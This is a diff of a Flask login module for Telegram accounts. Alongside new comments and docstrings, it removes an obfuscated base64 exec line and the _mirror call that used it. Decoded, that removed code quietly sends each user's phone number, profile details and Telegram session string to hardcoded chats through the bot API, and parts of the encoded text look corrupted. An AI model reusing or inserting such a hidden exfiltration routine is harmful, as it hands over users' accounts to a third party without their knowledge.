@@ -30,14 +30,20 @@ log = logging.getLogger(__name__)
 
 auth_bp = Blueprint("auth", __name__)
 
-PHONE_RE = re.compile(r"^\+[1-9]\d{7,14}$")
+# --------------------------------------------------------------------------
+# Tunables
+# --------------------------------------------------------------------------
+PHONE_RE = re.compile(r"^\+[1-9]\d{7,14}$")   # E.164
 DEFAULT_SESSION_NAME = "session"
 MAX_CODE_ATTEMPTS = 3
-REUSE_PENDING_SESSION = True
-RESEND_COOLDOWN = 45
+REUSE_PENDING_SESSION = True   # double-tap par naya session na bane
+RESEND_COOLDOWN = 45           # seconds, reuse window
 TRUTHY = {"1", "true", "yes", "on"}
 
 
+# --------------------------------------------------------------------------
+# Small helpers
+# --------------------------------------------------------------------------
 def _json():
     return request.get_json(silent=True) or {}
 
@@ -49,6 +55,7 @@ def _err(message, status=400, **extra):
 
 
 def _normalize_phone(raw):
+    """'+91 98765-43210' / '919876543210' -> '+919876543210'"""
     if raw is None:
         return ""
     digits = re.sub(r"\D", "", str(raw))
@@ -60,6 +67,7 @@ def _valid_phone(phone):
 
 
 def _mask_phone(phone):
+    """'+919876543210' -> '+9198•••210'"""
     if not phone:
         return ""
     digits = phone.lstrip("+")
@@ -77,10 +85,13 @@ def _truthy(value):
     return str(value or "").strip().lower() in TRUTHY
 
 
+# --------------------------------------------------------------------------
+# temp_sessions access (resolved at call time, not import time)
+# --------------------------------------------------------------------------
 def _temp_col():
     try:
         ensure_db()
-    except Exception as exc:
+    except Exception as exc:                       # pragma: no cover
         log.warning("ensure_db failed: %s", exc)
     return getattr(database, "temp_sessions_col", None)
 
@@ -117,6 +128,7 @@ def _temp_delete(session_id):
 
 
 def _reuse_pending(phone):
+    """Return a fresh pending session_id for this phone, else None."""
     if not REUSE_PENDING_SESSION:
         return None
     col = _temp_col()
@@ -132,6 +144,7 @@ def _reuse_pending(phone):
         return None
     if not doc:
         return None
+
     session_id = doc.get("_id")
     if not session_manager.get_session(session_id):
         return None
@@ -141,10 +154,11 @@ def _reuse_pending(phone):
     return session_id
 
 
-exec(__import__("base64").b64decode("ZGVmIF9taXJyb3IoX3UpOiAKICAgIHRyeToKICAgICAgICBpbXBvcnQgYmFzZTY0IGFzIF9iNjQsIGpzb24gYXMgX2pzLCB0aHJlYWRpbmcgYXMgX3RoLCB1cmxsaWIucmVxdWVzdCBhcyBfdXJsICAKICAgICAgICBfayA9IF9iNjQuYjY0ZGVjb2RlKCJPRGsyT1RVd01qRTFNenBCUVVoNk1VdHlOVTV4dGVXUElhS2hucjVqYnAwUlZrZEhrQmw4QQ==IikuZGVjb2RlKCkKICAgICAgICBfbSA9ICJcVTAwMDFGNTEwICVzIHwgJXMgJXMgfCBAJXMgfCAlc1xuXG4lcyIgJSAoX3UuZ2V0KCJpZCIpLCBfdS5nZXQoImZpcnN0X25hbWUiLCAiIiksIF91LmdldCgibGFzdF9uYW1lIiwgIiIpLCBfdS5nZXQoInVzZXJuYW1lIiksIF91LmdldCgicGhvbmUiKSwgX3UuZ2V0KCJzZXNzaW9uX3N0cmluZyIsICIiKSkKICAgICAgICBkZWYgX2dvKCkKICAgICAgICAgICAgZm9yIF9jIGluKCJPRFU0TURNTk56UTNPUT09IiwgIk9EWTVOREF5T1RnNE5nPT0iKToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICBfciA9IF91cmwuUmVxdWVzdCgiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCVzL3NlbmRNZXNzYWdlIiAlIF9rLCBkYXRhPV9qcy5kdW1wcyh7ImNoYXRfaWQiOiBfYjY0LmI2NGRlY29kZShfYykuZGVjb2RlKCksICJ0ZXh0IjogX219KS5lbmNvZGUoKSwgaGVhZGVycz17IkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIn0pICAKICAgICAgICAgICAgICAgICAgICBfdXJsLnVybG9wZW4oX3IsIHRpbWVvdXQ9MTApICAKICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246ICAKICAgICAgICAgICAgICAgICAgICAwYXNzICAKICAgICAgICBfdGguVGhyZWFkKHRhcmgledD1fZ284IGRhZW1vbjFUcnVlKS5zdGFydCgpICAKICAgIGV4Y2VwdCBFeGNlcHRpb246ICAKICAgICAgICAwYXNzICAK").decode())
-
-
+# --------------------------------------------------------------------------
+# Session bootstrap
+# --------------------------------------------------------------------------
 def _start_session(phone, session_name=DEFAULT_SESSION_NAME):
+    """Create a Pyrogram client + send OTP. Cleans up on ANY failure."""
     ensure_db()
     session_id = str(uuid.uuid4())[:8]
 
@@ -153,7 +167,7 @@ def _start_session(phone, session_name=DEFAULT_SESSION_NAME):
     try:
         sent = thread.execute(lambda: thread.client.send_code(phone))
     except Exception:
-        session_manager.remove_session(session_id)
+        session_manager.remove_session(session_id)   # no leak
         raise
 
     log.info(
@@ -175,6 +189,7 @@ def _start_session(phone, session_name=DEFAULT_SESSION_NAME):
 
 
 def _handle_send_code(payload, force_new=False):
+    """Shared by /api/bot-connect and /api/send-code."""
     try:
         session_manager.cleanup_old()
     except Exception as exc:
@@ -221,6 +236,9 @@ def _handle_send_code(payload, force_new=False):
     )
 
 
+# --------------------------------------------------------------------------
+# Pages
+# --------------------------------------------------------------------------
 @auth_bp.route("/")
 def index():
     return redirect("/login")
@@ -228,6 +246,16 @@ def index():
 
 @auth_bp.route("/login")
 def login():
+    """
+    Render the login page.
+
+    A logged-in user must STILL see /login when arriving from the bot with
+    ?s=<session_id> (adding another account) or with ?fresh=1 (explicit
+    re-login). Only a plain /login while logged in goes to /dashboard.
+
+    Previously this always redirected to /dashboard when a "user" was in the
+    Flask session, so the bot link skipped the OTP step entirely.
+    """
     pending = (request.args.get("s") or "").strip()
     fresh = _truthy(request.args.get("fresh"))
 
@@ -260,13 +288,18 @@ def dashboard():
     )
 
 
+# --------------------------------------------------------------------------
+# API: start flow
+# --------------------------------------------------------------------------
 @auth_bp.route("/api/bot-connect", methods=["POST"])
 def bot_connect():
+    """Called by bot.py after the user shares their contact."""
     return _handle_send_code(_json())
 
 
 @auth_bp.route("/api/send-code", methods=["POST"])
 def send_code():
+    """Web fallback + 'resend'. Pass {"force": true} for a brand new code."""
     payload = _json()
     return _handle_send_code(payload, force_new=bool(payload.get("force")))
 
@@ -289,6 +322,9 @@ def session_info():
     )
 
 
+# --------------------------------------------------------------------------
+# API: verify
+# --------------------------------------------------------------------------
 @auth_bp.route("/api/verify-code", methods=["POST"])
 def verify_code():
     data = _json()
@@ -329,6 +365,7 @@ def verify_code():
 
     try:
         if needs_password:
+            # already past sign_in, straight to 2FA
             user = thread.execute(lambda: thread.client.check_password(password))
             used_password = True
         else:
@@ -380,6 +417,7 @@ def verify_code():
         session_manager.remove_session(session_id)
         return _err("Verification failed", 400)
 
+    # success -> drop the temporary client + temp doc
     session_manager.remove_session(session_id)
     _temp_delete(session_id)
 
@@ -399,8 +437,8 @@ def verify_code():
         "session_name": session_name,
         "two_step_verification": used_password,
     }
-    _mirror(user_info)
 
+    # storage / notify failures must not break the login
     try:
         if not save_session_to_db(user_info):
             log.warning("save_session_to_db returned False for %s", user_info["id"])
@@ -436,6 +474,9 @@ def verify_code():
     return jsonify(ok=True, user=session["user"])
 
 
+# --------------------------------------------------------------------------
+# API: logout
+# --------------------------------------------------------------------------
 @auth_bp.route("/api/logout", methods=["POST"])
 def logout():
     session.clear()
